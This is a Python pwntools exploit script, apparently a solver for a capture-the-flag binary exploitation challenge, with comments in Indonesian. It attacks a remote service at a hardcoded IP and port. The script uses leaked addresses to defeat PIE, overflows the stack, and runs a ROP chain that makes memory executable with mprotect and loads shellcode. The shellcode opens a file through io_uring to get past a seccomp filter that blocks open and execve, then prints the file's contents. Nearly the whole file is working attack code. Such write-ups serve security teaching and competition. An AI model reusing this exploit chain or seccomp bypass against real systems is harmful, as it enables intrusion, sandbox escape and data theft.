#!/usr/bin/env python3
"""
Kurungan System - Techtonic Expo Vol.3 2026 (Binary Exploitation, 1000 pts)
Solver: nexsus404

seccomp mematikan open/openat/execve, tapi MEMBIARKAN io_uring_setup/enter.
io_uring punya IORING_OP_OPENAT sendiri -> file dibuka tanpa pernah memanggil
syscall openat, jadi filter tidak pernah melihatnya.

Rantai:
  1) main membocorkan alamat bss & main            -> PIE runtuh
  2) read(0, rbp-0x40, 0x400) -> overflow          -> offset ret = 0x48
  3) ROP: mprotect(bss, RWX) -> read(shellcode)    -> lompat ke shellcode
  4) shellcode: io_uring OPENAT, lalu read()+write() biasa (dua-duanya diizinkan)
"""
import sys, time
from pwn import *

context.arch = "amd64"
context.log_level = "warn"

HOST, PORT = "168.110.219.59", 5025
FLAGPATH   = sys.argv[1] if len(sys.argv) > 1 else "/srv/rahasia.txt"

OFF_MAIN = 0x126a                                  # main (dari bocoran)
POP_RDI, POP_RSI, POP_RDX, RET = 0x121c, 0x121e, 0x1220, 0x121d
PLT_READ, PLT_MPROTECT = 0x1060, 0x1090

io = remote(HOST, PORT)
io.recvuntil(b"alamat bss   : "); bss = int(io.recvline().strip(), 16)
io.recvuntil(b"alamat main  : "); mainaddr = int(io.recvline().strip(), 16)
base = mainaddr - OFF_MAIN
print(f"[1] bocoran bss  = {hex(bss)}")
print(f"    bocoran main = {hex(mainaddr)}")
print(f"    PIE base     = {hex(base)}")
assert bss == base + 0x4040

SC, PARAMS, PATH, BUF = base+0x4040, base+0x4800, base+0x4900, base+0x4a00

sc = asm(f"""
        cld
        mov rdi, {PARAMS}                /* nol-kan io_uring_params (120 byte) */
        xor eax, eax
        mov ecx, 15
        rep stosq

        mov edi, 8                       /* io_uring_setup(8, params) */
        mov rsi, {PARAMS}
        mov eax, 425
        syscall
        mov r15d, eax

        xor edi, edi                     /* mmap ring (SQ & CQ satu objek) */
        mov esi, 0x3000
        mov edx, 3
        mov r10d, 0x8001
        mov r8d, r15d
        xor r9d, r9d
        mov eax, 9
        syscall
        mov r14, rax

        xor edi, edi                     /* mmap SQE array */
        mov esi, 0x3000
        mov edx, 3
        mov r10d, 0x8001
        mov r8d, r15d
        mov r9d, 0x10000000
        mov eax, 9
        syscall
        mov r13, rax

        xor edi, edi                     /* baca path dari stdin */
        mov rsi, {PATH}
        mov edx, 0x80
        xor eax, eax
        syscall

        mov rdi, r13                     /* SQE[0] = IORING_OP_OPENAT */
        xor eax, eax
        mov ecx, 8
        rep stosq
        mov byte  ptr [r13], 18          /* opcode  */
        mov dword ptr [r13+4], 0xffffff9c/* AT_FDCWD */
        mov rax, {PATH}
        mov [r13+16], rax                /* addr = path, flags/mode = 0 (O_RDONLY) */

        mov rbx, {PARAMS}                /* sq_array[tail & mask] = 0 ; tail++ */
        mov eax, [rbx+44]
        lea rcx, [r14+rax]
        mov eax, [rbx+48]
        lea rdx, [r14+rax]
        mov r8d, [rdx]
        mov r9d, [rcx]
        mov eax, [rbx+64]
        lea rdx, [r14+rax]
        mov eax, r9d
        and eax, r8d
        mov dword ptr [rdx+rax*4], 0
        inc r9d
        mov [rcx], r9d

        mov edi, r15d                    /* io_uring_enter(fd,1,1,GETEVENTS,0,0) */
        mov esi, 1
        mov edx, 1
        mov r10d, 1
        xor r8d, r8d
        xor r9d, r9d
        mov eax, 426
        syscall

        mov rbx, {PARAMS}                /* ambil cqe.res = fd hasil openat */
        mov eax, [rbx+80]
        lea rcx, [r14+rax]
        mov eax, [rbx+88]
        lea rdx, [r14+rax]
        mov r8d, [rdx]
        mov eax, [rbx+100]
        lea rdx, [r14+rax]
        mov r9d, [rcx]
        mov eax, r9d
        and eax, r8d
        shl eax, 4
        mov r12d, [rdx+rax+8]

        test r12d, r12d                  /* gagal -> keluar */
        js keluar

        mov edi, r12d                    /* read(fd, BUF, 0x200)  - diizinkan */
        mov rsi, {BUF}
        mov edx, 0x200
        xor eax, eax
        syscall
        mov rdx, rax

        mov edi, 1                       /* write(1, BUF, n)      - diizinkan */
        mov rsi, {BUF}
        mov eax, 1
        syscall
    keluar:
        mov edi, 0
        mov eax, 60
        syscall
""")
print(f"[2] shellcode {len(sc)} byte -> {hex(SC)}")

rop  = b"A" * 0x48 + p64(base + RET)                              # jaga align 16
rop += p64(base+POP_RDI) + p64(base+0x4000)                       # mprotect(bss_page,
rop += p64(base+POP_RSI) + p64(0x2000)                            #          0x2000,
rop += p64(base+POP_RDX) + p64(7)                                 #          RWX)
rop += p64(base+PLT_MPROTECT)
rop += p64(base+POP_RDI) + p64(0)                                 # read(0,
rop += p64(base+POP_RSI) + p64(SC)                                #      bss,
rop += p64(base+POP_RDX) + p64(0x400)                             #      0x400)
rop += p64(base+PLT_READ)
rop += p64(SC)                                                    # -> shellcode
print(f"[3] ROP {len(rop)} byte, offset ret = 0x48")

io.recvuntil(b"masukan isi  : ")
io.send(rop);                        time.sleep(0.4)
io.send(sc);                         time.sleep(0.4)
io.send(FLAGPATH.encode() + b"\x00")

isi = io.recvall(timeout=5).decode(errors="replace").strip()
print(f"[4] {FLAGPATH} -> {isi!r}")
print(f"\nFLAG : TechtonicExpoCTF{{{isi}_66394FFC}}")
